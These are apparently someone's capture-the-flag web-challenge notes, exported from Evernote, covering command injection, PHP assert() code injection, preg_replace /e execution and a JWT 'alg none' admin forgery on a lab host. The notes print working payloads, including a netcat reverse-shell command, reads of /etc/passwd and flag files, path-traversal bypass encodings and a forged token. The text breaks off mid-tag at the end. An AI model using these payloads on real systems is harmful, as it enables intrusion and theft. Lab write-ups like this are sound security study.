<html>
<head>
  <title>WEB</title>
  <basefont face="Segoe UI" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="Evernote Windows/308919 (en-US, DDL); Windows/6.3.0 (Win64);"/>
  <style>
    body, td {
      font-family: Segoe UI;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="5014"/>
<h1>WEB</h1>

<div>
<span><div><div><font style="font-size: 14pt;"><span style="font-weight: bold;">JSEasy1Â  :Â  Â </span> <span style="font-weight: bold;">Â  Â  Â  Â  Â  Â  Â </span> <span style="font-weight: bold;">flagÂ  Â :Â  Â  Â  Â  Â </span><font><span style="color: rgb(255, 0, 0); font-weight: bold;">Sl7{</span><span style="color: rgb(255, 0, 0); font-weight: bold;">SeCRET213#_T</span><span style="color: rgb(255, 0, 0); font-weight: bold;">}Â </span></font></font><br/></div><div>Â </div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><b><font color="#3665EE">function login(){</font></b></div><div><b><font color="#3665EE"><br/></font></b></div><div><b><font color="#3665EE"><br/></font></b></div><div><b><font color="#3665EE">Â Â Â Â var username = document.getElementById(&quot;inputUser&quot;).value;</font></b></div><div><b><font color="#3665EE">Â Â Â Â var password = document.getElementById(&quot;inputPassword&quot;).value;</font></b></div><div><b><font color="#3665EE"><br/></font></b></div><div><b><font color="#3665EE"><br/></font></b></div><div><b><font style="color: rgb(54, 101, 238);">Â Â Â Â var Secret = [&quot;admin:SeCRET213#_T&quot;];</font></b></div><div><b><font color="#3665EE">Â Â Â Â for (i = 0; i &lt; Secret.length; i++)</font></b></div><div><b><font color="#3665EE">Â Â Â Â {</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â if (Secret[i].indexOf(username) == 0)</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â {</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â Â Â Â Â var Split = Secret[i].split(&quot;:&quot;);</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â Â Â Â Â var TheUsername = Split[0];</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â Â Â Â Â var ThePassword = Split[1];</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â Â Â Â Â if (username == TheUsername &amp;&amp; password == ThePassword)</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â Â Â Â Â {</font></b></div><div><b><font style="color: rgb(54, 101, 238);">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â alert(&quot;You can use this password as a flag Sl7{})&quot;);</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â Â Â Â Â }</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â }</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â else</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â {</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â Â Â Â Â alert(&quot;NooOOooo.&quot;)</font></b></div><div><b><font color="#3665EE">Â Â Â Â Â Â Â Â }</font></b></div><div><b><font color="#3665EE">Â Â Â Â }</font></b></div><div><b><font color="#3665EE"><br/></font></b></div><div><b><font color="#3665EE"><br/></font></b></div><div><b><font color="#3665EE">}</font></b></div></div><div><br/></div><hr/><div><br/></div><div><font style="font-size: 14pt;"><span style="font-weight: bold;">A1:Â  Â  Â </span> <span style="color: rgb(134, 0, 164); font-weight: bold;">Â </span><span style="color: rgb(134, 0, 164); font-weight: bold;">a1-injection-owasp</span></font></div><div><font style="font-size: 14pt;"><br/></font></div><div><span style="color: rgb(54, 101, 238); font-weight: bold;"><font style="font-size: 14pt;">Its OS-command injection</font></span></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">found :Â </span><span style="color: rgb(77, 206, 29); font-weight: bold;">gnats:x:41:41:Gnats Bug-Reporting System (admin)Â  Â  Â </span> <span style="color: rgb(227, 0, 0); font-weight: bold;">But no use</span></div><div><img src="WEB_files/Image.png" type="image/png" data-filename="Image.png"/></div><div><br/></div><div><span style="font-weight: bold;">we can assume that grep is being used in background .</span></div><div><span style="font-weight: bold;">metacharacters are being filtered out also .</span></div><div><br/></div><div><br/></div><div><span style="font-size: 14pt; font-weight: bold;">POCÂ  Â  Â :Â  Â </span><span style="font-size: 14pt; color: rgb(255, 0, 0); font-weight: bold;">Sl7&lt;/flag.txt</span></div><div><br/></div><div><span style="color: rgb(255, 0, 0); font-weight: bold;"><img src="WEB_files/Image [1].png" type="image/png" data-filename="Image.png"/></span></div><div><br/></div><div><span style="font-size: 12pt; font-weight: bold;">flagÂ  :</span><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">Â </span> <span style="font-size: 12pt; color: rgb(227, 0, 0); font-weight: bold;">Sl7{BlinD-COMManD-InjECti0n-D0nE}</span></div><div><br/></div><div><br/></div><hr/><div><br/></div><div><span style="font-weight: bold;"><font style="font-size: 14pt;">as33rt1Â  Â  Â  Â  Â  Â  Â  Â :Â  Â assert</font></span></div><div><span style="font-weight: bold;"><font style="font-size: 14pt;">Can you read Internal files, If yes dan read /flag.txtÂ  Â  Â :</font></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 11pt; font-weight: bold;">fuzz :</span></div><div><font style="font-size: 11pt;"><a href="http://docker.h4x0rbox.com:2080/?page=" style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">http://docker.h4x0rbox.com:2080/?page=</a><span style="font-size: 11pt; font-weight: bold;">1</span></font></div><div><font style="font-size: 11pt;"><br/></font></div><div><a href="http://docker.h4x0rbox.com:2080/?page=" style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">http://docker.h4x0rbox.com:2080/?page=</a><span style="font-size: 11pt; color: rgb(45, 79, 201); font-weight: bold;">.</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold;">Warning: assert(): assert(&quot;strpos('$file', '..') === false&quot;): &quot;strpos('..php', '..') === false&quot; failed in /var/www/html/index.php on line 8</span></div><div><span style="font-size: 11pt; color: rgb(255, 0, 0); font-weight: bold;">Sorry script kiddie you should try harder!</span></div><div><b style="font-size: 12pt;"><br/></b></div><div><b style="font-size: 12pt;"><br/></b></div><div><b style="font-size: 12pt;"><a href="http://docker.h4x0rbox.com:2080/?page=" style="font-size: 12pt; font-weight: bold; color: rgb(134, 0, 164);">http://docker.h4x0rbox.com:2080/?page=</a><span style="font-size: 12pt; font-weight: bold; color: rgb(45, 79, 201);">'</span></b></div><div><b style="font-size: 12pt;"><br/></b></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">Fatal error: Uncaught ParseError: syntax error, unexpected '', '' (T_CONSTANT_ENCAPSED_STRING), expecting ')' in /var/www/html/index.php(8) : assert code:1 Stack trace: #0 /var/www/html/index.php(8): assert('strpos(''.php',...', 'assert(&quot;strpos(...') #1 {main} Next Error: Failure evaluating code: assert(&quot;strpos('$file', '..') === false&quot;):&quot;strpos(''.php', '..') === false&quot; in /var/www/html/index.php:8 Stack trace: #0 /var/www/html/index.php(8): assert('strpos(''.php',...', 'assert(&quot;strpos(...') #1 {main} thrown in /var/www/html/index.php on line 8</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(79, 0, 154); font-weight: bold;">Warning: assert(): assert(&quot;strpos('$file', '..') === false&quot;): &quot;strpos('..php', '..') === false&quot; failed in /var/www/html/index.php on line 8</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">PHP ASSERT() VULNERABLE TO LOCAL FILE INCLUSION</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 11pt; font-weight: bold;">This application using assert() function to do checks if assertion is FALSE.</span></div><div><font style="font-size: 11pt;"><br/></font></div><div><font style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(50, 135, 18); font-weight: bold;">Adding a null byte at the end of the same urlÂ  Â  Â  Â  Â  Â  :Â Â </span><span style="border: 0px; width: auto; max-height: 600px; overflow: auto; background-color: var(--black-050); border-radius: 3px; overflow-wrap: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: 11pt; background-color: var(--black-050); font-family: Consolas, Menlo, Monaco, &quot;Lucida Console&quot;, &quot;Liberation Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Bitstream Vera Sans Mono&quot;, &quot;Courier New&quot;, monospace, sans-serif; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">%00</span></span></font></div><div><a href="http://docker.h4x0rbox.com:2080/?page=." style="font-size: 11pt; font-weight: bold;">http://docker.h4x0rbox.com:2080/?page=.%00</a></div><div><span style="font-size: 11pt; font-weight: bold;">Warning: include(): Failed opening '.' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 9</span></div><div><font style="font-size: 11pt;"><br/></font></div><div><span style="font-size: 11pt; font-weight: bold;">nullbyte is allowed .</span></div><div><font style="font-size: 11pt;"><br/></font></div><div><font style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">nowÂ </span><span style="font-size: 11pt; font-weight: bold;">challenge is to get .. past the filter .</span></font></div><div><span style="font-size: 11pt; font-weight: bold;">using 16-bit Unicode encoding (. = %u002e)</span></div><div><span style="font-size: 11pt; font-weight: bold;">double URL encoding (. = %252e)</span></div><div><span style="font-size: 11pt; font-weight: bold;">overlong UTF-8 Unicode encoding (. can be %c0%2e, %e0%40%ae, %c0ae)</span></div><div><font style="font-size: 11pt;"><br/></font></div><div><span style="font-size: 11pt; font-weight: bold;">Path traversal filter bypass techniques?</span></div><div><a href="https://security.stackexchange.com/questions/96736/path-traversal-filter-bypass-techniques/96991#96991" style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">https://security.stackexchange.com/questions/96736/path-traversal-filter-bypass-techniques/96991#96991</a></div><div><font style="font-size: 11pt;"><br/></font></div><div><span style="font-size: 11pt; color: rgb(250, 122, 0); font-weight: bold;">But nothing still!!!</span></div><div><br/></div><div><span style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">Try passing a</span> <span style="font-size: 11pt; color: rgb(227, 0, 0); font-weight: bold;">'</span> <span style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">as input. If it throws an exception like</span> <span style="font-size: 11pt; color: rgb(227, 0, 0); font-weight: bold;">Parse error: syntax error, unexpected â€™â€™, â€™â€™ (T_CONSTANT_ENCAPSED_STRING) in ...</span> <span style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">then it is vulnerable to code injection.</span></div><div><span style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">In that case you can open any file like:</span></div><div><span style="font-size: 11pt; color: rgb(227, 0, 0); font-weight: bold;">' and die(show_source('/etc/passwd')) or '</span></div><div><font style="font-size: 11pt;"><br/></font></div><div><a href="https://github.com/birdsoup/CTF-Writeups/tree/master/2016/CSAW/mfw" style="font-size: 11pt; color: rgb(28, 51, 135); font-weight: bold;">https://github.com/birdsoup/CTF-Writeups/tree/master/2016/CSAW/mfw</a></div><div><span style="font-size: 11pt; font-weight: bold;">got this code from the above link :</span></div><div><span style="font-size: 11pt; color: rgb(166, 0, 196); font-weight: bold;">', '..') === false and $myfile = fopen(&quot;templates/flag.php&quot;, &quot;r&quot;) and exit(fread($myfile,filesize(&quot;templates/flag.php&quot;))) or true or strpos('</span></div><div><font color="#E30000" style="font-size: 11pt;"><br/></font></div><div><span style="font-size: 11pt; font-weight: bold;">modified the code :</span></div><div><span style="font-size: 11pt; color: rgb(227, 0, 0); font-weight: bold;">', '..') === false and $myfile = fopen(&quot;/root/flag.txt&quot;, &quot;r&quot;) and exit(fread($myfile,filesize(&quot;/root/flag.txt&quot;))) or true or strpos('</span></div><div><span style="font-size: 11pt; color: rgb(227, 0, 0); font-weight: bold;">Â </span></div><div><span style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">It worked!!</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 14pt; font-weight: bold;">POC :</span></div><div><span style="font-size: 12pt;"><a href="http://ocker.h4x0rbox.com:2080/?page=" style="font-size: 12pt; color: rgb(134, 0, 164); font-weight: bold;">docker.h4x0rbox.com:2080/?page=</a></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(28, 51, 135); font-weight: bold;">', '..') === false and $myfile = fopen(&quot;/root/flag.txt&quot;, &quot;r&quot;) and exit(fread($myfile,filesize(&quot;/root/flag.txt&quot;))) or true or strpos('</span></span></div><div><br/></div><div><font style="font-size: 14pt;"><span style="font-weight: bold;">flagÂ  :Â </span> <span style="color: rgb(227, 0, 0); font-weight: bold;">Â </span><span style="color: rgb(227, 0, 0); font-weight: bold;">SL7{0cba7ef0c9104cc90978b1cd1bf816cd4a1}</span></font></div><div><span style="border: 0px; width: auto; max-height: 600px; overflow: auto; background-color: var(--black-050); border-radius: 3px; overflow-wrap: normal; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><font style="font-size: 12pt;"><br/></font></span></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 14pt; font-weight: bold;">Pattern1 :</span></div><div><font style="font-size: 14pt;"><br/></font></div><div><span style="font-size: 11pt; color: rgb(188, 0, 88); font-weight: bold;">Warning: preg_replace(): Delimiter must not be alphanumeric or backslash in /var/www/html/msg-gen.php on line 4</span></div><div><font style="font-size: 11pt;"><br/></font></div><div><span style="font-size: 11pt; font-weight: bold;">will try :Â  Â Â </span><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">php preg_replace e modifier vulnerability</span></span></div><div><span style="font-size: 11pt;"><a href="https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/" style="font-size: 11pt; font-weight: bold;">https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/</a></span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">Testing it :Â </span></span></div><div><span style="font-size: 11pt; color: rgb(134, 0, 164);"><img src="WEB_files/Image [2].png" type="image/png" data-filename="Image.png"/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">It Worked!!</span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;"><img src="WEB_files/Image [3].png" type="image/png" data-filename="Image.png" width="346"/></span></span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">Now testing some commands :</span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(188, 0, 88); font-weight: bold;">system('time');Â Â  Â Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â Â  Â Â Â  Â Â Â  Â Â  Â  Â :Â  Â  Â no output</span></span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(188, 0, 88); font-weight: bold;">system('ver');Â  Â Â  Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â :Â  Â  Â  Â no output</span></span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(188, 0, 88); font-weight: bold;">system('nc -e /bin/sh 10.90.90.22 8000');Â  Â  Â  Â </span></span><span style="font-size: 11pt; color: rgb(188, 0, 88); font-weight: bold;">:Â  Â  Â  Â no output</span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(188, 0, 88); font-weight: bold;">system('locate flag.txt &gt; flc.txt');Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â </span></span><span style="font-size: 11pt; color: rgb(188, 0, 88); font-weight: bold;">:Â  Â  Â  Â no output</span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(118, 0, 216); font-weight: bold;">system('id');Â  Â  Â  Â  Â  Â  Â Â  Â Â Â  Â Â Â  Â Â Â Â Â  Â  Â :Â  Â  Â Worked!</span></span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(118, 0, 216); font-weight: bold;">system('pwd');Â  Â  Â  Â  Â  Â  Â Â  Â Â Â  Â Â Â  Â Â Â  Â :Â  Â  Â Worked!</span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(118, 0, 216); font-weight: bold;">system('uptime;id');Â  Â  Â Â  Â  Â Â Â Â  Â Â Â  Â :Â  Â  Â  worked!</span></span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(118, 0, 216); font-weight: bold;">system('cat /etc/passwd');Â  Â  Â  Â  Â :Â  Â  Â worked!</span></span></span></div><div><span style="font-size: 11pt;"><br/></span></div><div><br/></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(28, 51, 135); font-weight: bold;">system('find / -name flag.txt 2&gt;/dev/null');Â  Â  Â  Â  Â </span> <span style="font-size: 11pt; font-weight: bold;">Â :Â  Â GOT the location!</span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">location :Â  Â </span><span style="font-size: 11pt; color: rgb(227, 0, 0); font-weight: bold;">Â </span></span><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(227, 0, 0); font-weight: bold;">/sl7/flag.txt</span></span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 14pt; font-weight: bold;">POC :Â </span> <span style="font-size: 14pt; color: rgb(255, 0, 0); font-weight: bold;">Â  Â system('cat /sl7/flag.txt ');</span></div><div><font color="#FF0000" style="font-size: 14pt;"><br/></font></div><div><font style="font-size: 14pt;"><span style="font-size: 14pt; font-weight: bold;">flagÂ  :</span><span style="font-size: 14pt; color: rgb(255, 0, 0); font-weight: bold;">Â  Â SL7{PreG-ReplACE-Fini$h!}</span></font></div><div><font style="font-size: 14pt;"><br/></font></div><hr/><div><font style="font-size: 14pt;"><br/></font></div><div><span style="font-size: 14pt; font-weight: bold;">Token1 :Â  Â  Â  [feels like cookie related]</span></div><div><span style="font-size: 14pt;"><span style="font-size: 14pt; font-weight: bold;">Only Admin can see the flag ğŸ˜›</span></span></div><div><span style="font-size: 14pt;"><span style="font-size: 14pt; font-weight: bold;"><img src="WEB_files/Image [4].png" type="image/png" data-filename="Image.png" width="393"/></span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">(Testing Account):Â  Â  Â Â </span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">username: touhid</span></span></div><div><b style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold; color: rgb(134, 0, 164);">password: test</span></b></div><div><b style="font-size: 11pt;"><br/></b></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;"><img src="WEB_files/Image [5].png" type="image/png" data-filename="Image.png" width="501"/></span></span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">Response during login with touhid :</span></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div style="color: rgb(134, 0, 164);"><span style="font-size: 11pt;"><b>HTTP/1.1 302 Found</b></span></div><div><span style="font-size: 11pt;"><b><font color="#9C004C">Set-Cookie:</font> <font style="color: rgb(134, 0, 164);">token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNTg5NjU0MDY3MDI1LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1ODk2NTQwNjd9.WSl8rEQetpgEWQ_h3OuEKE_bLeaa186KYakSxN8J5Zk; path=/; httponly</font></b></span></div><div style="color: rgb(134, 0, 164);"><span style="font-size: 11pt;"><b>Location: /private</b></span></div><div style="color: rgb(134, 0, 164);"><span style="font-size: 11pt;"><b>Date: Sat, 16 May 2020 18:34:27 GMT</b></span></div><div style="color: rgb(134, 0, 164);"><span style="font-size: 11pt;"><b>Connection: close</b></span></div><div style="color: rgb(134, 0, 164);"><span style="font-size: 11pt;"><b>Content-Length: 0</b></span></div></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">in browser checking the token :</span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(45, 79, 201); font-weight: bold;">token:&quot;</span><span style="font-size: 11pt; color: rgb(134, 0, 164); font-weight: bold;">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNTg5NjU0NTY5NDQxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1ODk2NTQ1Njl9._dpUcxVSrDh3yOtnxUf1jiSoPf0VrxAELTGB6y-MFFs</span><span style="font-size: 11pt; color: rgb(45, 79, 201); font-weight: bold;">&quot;</span></span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(45, 79, 201); font-weight: bold;">After some search it looks likeÂ  :Â </span> <span style="font-size: 11pt; color: rgb(227, 0, 0); font-weight: bold;">json web tokens</span></span></div><div><span style="font-size: 11pt;"><a href="https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen" style="font-size: 11pt; font-weight: bold;">https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen</a></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(50, 135, 18); font-weight: bold;">ItÂ Â uses token-based authentication.</span></span></div><div><b style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold; color: rgb(50, 135, 18);">we can try to alter the token to get admin access .</span></b></div><div><span style="font-size: 11pt;"><a href="https://jwt.io/" style="font-size: 11pt; color: rgb(50, 135, 18); font-weight: bold;">https://jwt.io/</a><span style="font-size: 11pt; color: rgb(50, 135, 18); font-weight: bold;">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â </span><span style="font-size: 11pt; font-weight: bold;">:Â  Â  to decode token</span></span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">Attacking JWT token :Â Â </span></span> <span style="font-size: 11pt;"><a href="https://medium.com/%40umang.chavda26/attacking-jwt-token-16843a84eb44" style="font-size: 11pt; font-weight: bold;">https://medium.com/@umang.chavda26/attacking-jwt-token-16843a84eb44</a></span></div><div><a href="https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6" style="font-size: 11pt; font-weight: bold;">https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6</a></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">After logging as user . again refresh . intercept the request in burp . this time our request will have a token also which was set earlier by the server</span></span></div><div><b style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold; color: rgb(26, 144, 185);">Generated token isÂ  JWT token which is built using three components i.e. header (algorithm &amp; type), payload (base64 encoded data) and signature. There is known vulnerability in JWT which allows to change the payload data and process it on the server by changing the algorithm type to â€œNoneâ€.</span></b></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;"><img src="WEB_files/Image [6].png" type="image/png" data-filename="Image.png" width="530"/></span></span></div><div><span style="font-size: 11pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 11pt;"><b><font color="#000000">token=</font></b>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNTg5NjU4MjE4MTAxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1ODk2NTgyMTh9.ho08oCHJOw34SULdnpls5P3czzeWNOu_TO52LaE-aFM</span></div></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">excluding signature:</span></span></div><div><span style="font-size: 10pt;">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNTg5NjU4MjE4MTAxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1ODk2NTgyMTh9.</span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">changing alg. to none :</span></span></div><div><span style="font-size: 10pt;">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJhdXRoIjoxNTg5NjU4MjE4MTAxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1ODk2NTgyMTh9.</span></div><div><font style="font-size: 10pt;"><br/></font></div><div><span style="font-size: 11pt;"><a href="https://www.jsonwebtoken.io/" style="font-size: 11pt; font-weight: bold;">https://www.jsonwebtoken.io/</a><span style="font-size: 11pt; font-weight: bold;">Â  Â  :Â  Â to modify the payload of token</span></span></div><div><span style="font-size: 11pt;"><a href="https://www.base64encode.org/" style="font-size: 11pt; font-weight: bold;">https://www.base64encode.org/</a></span></div><div><span style="font-size: 11pt; font-weight: bold;">Change user to admin payload .</span></div><div><span style="font-size: 11pt; font-weight: bold;">After</span> <span style="font-size: 11pt; color: rgb(156, 0, 76); font-weight: bold;">changing</span> <span style="font-size: 11pt; font-weight: bold;">alg to none, remove the signature data from the JWT (only header + â€˜.â€™ + payload + â€˜.â€™) and submit it to the server.</span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">Some JWT libraries support the none algorithm, that is, no signature algorithm. When the alg is none, the backend will not perform signature verification.</span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">Will test this !!</span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; font-weight: bold;">modified token :</span> <span style="font-size: 11pt; color: rgb(156, 0, 76); font-weight: bold;">(remember to remove base64 padding which is ==)</span></span></div><div><span style="color: rgb(134, 0, 164); font-weight: bold;">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNTg5NjU4MjE4MTAxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTg5NjU4MjE4fQ.</span></div><div><b style="font-size: 11pt;"><br/></b></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 14pt; font-weight: bold;">POC:</span><span style="font-size: 11pt; font-weight: bold;">Â </span></div><div><span style="color: rgb(134, 0, 164); font-weight: bold;">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNTg5NjU4MjE4MTAxLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NjguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82OC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTg5NjU4MjE4fQ.</span></div><div><span style="font-size: 11pt;"><br/></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(50, 135, 18); font-weight: bold;"><img src="WEB_files/Image [7].png" type="image/png" data-filename="Image.png"/></span></span></div><div><span style="font-size: 11pt;"><span style="font-size: 11pt; color: rgb(50, 135, 18); font-weight: bold;"><img src="WEB_files/Image [8].png" type="image/png" data-filename="Image.png" width="385"/></span></span></div><div><span style="font-size: 